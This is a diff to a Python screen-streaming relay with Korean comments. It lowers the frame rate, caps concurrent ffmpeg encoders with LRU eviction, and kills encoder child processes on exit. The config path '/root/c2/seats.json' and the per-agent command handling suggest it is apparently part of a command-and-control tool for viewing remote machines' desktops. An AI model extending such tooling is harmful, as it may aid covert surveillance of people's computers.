@@ -27,6 +27,7 @@
 #     대역폭 손해 없이 재생 타임라인 연속성 확보), RFB 끊김 중엔 1fps 저감.
 #  6. ZLIB(6) 인코딩 광고 + 디코드(연속 zlib 스트림) — 서버가 지원하면 인바운드 대역폭 대폭 절감.
 #     미지원/디코드 실패 좌석은 Raw로 자동 폴백(SEAT_NO_ZLIB).
+import atexit, signal
 import websocket, ssl, struct, time, json, threading, os, sys, base64, hashlib, subprocess, shutil, zlib
 from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
@@ -42,7 +43,7 @@ SCALE=(960,540)
 SEATS_FILE="/root/c2/seats.json"
 
 FFMPEG = shutil.which("ffmpeg") or "ffmpeg"
-H264_FPS = 24           # 타깃 프레임레이트 — 15는 끊김, 30은 스왑. 24로 중간
+H264_FPS = 15           # 타깃 프레임레이트 — 1 vCPU 대응: 좌석당 인코더 CPU 절감 (24 → 15)
 FULL_TIMEOUT = 60.0     # full/본문 수신 타임아웃(초)
 POLL_IDLE = 0.7         # 폴링 모드 증분 요청 무응답 판정(초) — v2 3.0에서 단축
 CONT_TIMEOUT = 2.0      # continuous 모드 서버 푸시 대기(초) — 정적 화면이면 이 간격으로 idle
@@ -154,6 +155,45 @@ SEAT_POLL_ONLY = set()             # continuous 미지원으로 확인된 좌석
 SEAT_NO_ZLIB = set()               # ZLIB 디코드 실패 좌석 → Raw만 광고
 SEAT_THREADS = set()                # 실행 중 좌석 스레드 — 중복 스폰 방지 (prune→재입장 레이스 방어)
 SEAT_THREADS_LOCK = threading.Lock()
+MAX_ACTIVE_ENCODERS = 3             # 동시 인코더 상한 — 1 vCPU 대응, 초과 시 LRU 회수
+STT_BY_NAME = {}                    # name -> 좌석 공유 상태(stt) 인덱스 — 인코더 상한 회수용
+STT_BY_NAME_LOCK = threading.Lock()
+_PROCS = set()                      # 살아있는 ffmpeg 자식 — 종료 시 일괄 정리
+_PROCS_LOCK = threading.Lock()
+
+def _kill_all_encoders():
+    with _PROCS_LOCK:
+        procs = list(_PROCS)
+    for p in procs:
+        try:
+            if p.poll() is None:
+                p.kill()
+        except Exception:
+            pass
+
+def _on_signal_killenc(signum, frame):
+    _kill_all_encoders()
+    sys.exit(0)
+
+atexit.register(_kill_all_encoders)
+try:
+    signal.signal(signal.SIGTERM, _on_signal_killenc)
+    signal.signal(signal.SIGINT, _on_signal_killenc)
+except Exception:
+    pass
+
+def _evict_oldest_encoders(agent_id):
+    """동시 인코더 상한 초과 시 — 마지막 킵얼라이브(=stream_deadline)가 가장 옛날 좌석부터 회수."""
+    with STT_BY_NAME_LOCK:
+        live = [(nm, stt.stream_deadline) for nm, stt in STT_BY_NAME.items()
+                if nm != agent_id and stt.want_stream.is_set()]
+    live.sort(key=lambda kv: kv[1])
+    over = len(live) + 1 - MAX_ACTIVE_ENCODERS
+    for nm, _ in live[:max(0, over)]:
+        stt = STT_BY_NAME.get(nm)
+        if stt is not None:
+            stt.want_stream.clear()
+            print(f"[{nm}] 인코더 상한({MAX_ACTIVE_ENCODERS}) 초과 — LRU 회수", flush=True)
 SEAT_DIRS = {}   # 좌석 주소 자산 캐시: name -> {"status": "ok"/"fail", "ts": 시각} — ok 상태는 재해석하지 않음(주소 회전 방지)
 
 def refresh_seats():
@@ -467,7 +507,7 @@ class H264Streamer:
         self._cur = None
         self._stop = False
         tw = min(target_w, w)
-        gop = 24                     # 1 GOP = 1초(24fps) — 매 프레임 키프레임 낭비 제거, 전환 지연 최대 1초
+        gop = H264_FPS               # 1 GOP = 1초(fps 연동) — 매 프레임 키프레임 낭비 제거, 전환 지연 최대 1초
         cmd = [FFMPEG, "-hide_banner", "-loglevel", "error",
                "-f", "rawvideo", "-pixel_format", "bgr0",
                "-video_size", f"{w}x{h}", "-framerate", str(fps), "-i", "pipe:0",
@@ -480,6 +520,8 @@ class H264Streamer:
                "pipe:1"]
         self.proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.DEVNULL, bufsize=0)
+        with _PROCS_LOCK:
+            _PROCS.add(self.proc)
         self._reader = threading.Thread(target=self._read_loop, daemon=True)
         self._reader.start()
 
@@ -501,8 +543,15 @@ class H264Streamer:
         except Exception: pass
         try: self.proc.terminate()
         except Exception: pass
-        try: self.proc.wait(timeout=3)   # reap — 미회수면 defunct 잔존
-        except Exception: pass
+        try:
+            self.proc.wait(timeout=3)   # reap — 미회수면 defunct 잔존
+        except Exception:
+            try: self.proc.kill()       # TERM 무시 시 강제 — 자식 잔존은 CPU 누수
+            except Exception: pass
+            try: self.proc.wait(timeout=2)
+            except Exception: pass
+        with _PROCS_LOCK:
+            _PROCS.discard(self.proc)
 
     def _read_loop(self):
         try:
@@ -613,6 +662,8 @@ def seat_loop(name):
         stt.want_stream = threading.Event() # 온디맨드 게이트 — stream_start 수신 시에만 RFB/인코더 구동
         stt.stream_deadline = 0.0           # 킵얼라이브(stream_start) 갱신 만료 시점 — 경과 시 게이트 해제
         stt.rfb_thread = None               # rfb 수신 스레드 핸들 — stream_start 시 사망 재스폰 판정용
+        with STT_BY_NAME_LOCK:
+            STT_BY_NAME[name] = stt
 
         # ---- 송출 대기 큐 (feed → push) ----
         pushq = []
@@ -907,6 +958,8 @@ def seat_loop(name):
                     jid = msg.get("id"); ct_ = msg.get("cmd_type", "")
                     data = ""; success = True; err = ""
                     if ct_ in ("stream_start", "stream_start2"):
+                        try: _evict_oldest_encoders(name)
+                        except Exception as evx: print(f"[{name}] evict EXC {type(evx).__name__}: {evx}", flush=True)
                         print(f"[{name}] stream_start received → want_stream", flush=True)
                         stt.want_stream.set(); stt.stream_deadline = time.time() + 90
                         rt = stt.rfb_thread
@@ -941,6 +994,8 @@ def seat_loop(name):
     finally:
         with SEAT_THREADS_LOCK:
             SEAT_THREADS.discard(name)
+        with STT_BY_NAME_LOCK:
+            STT_BY_NAME.pop(name, None)
 
 
 if __name__ == "__main__":
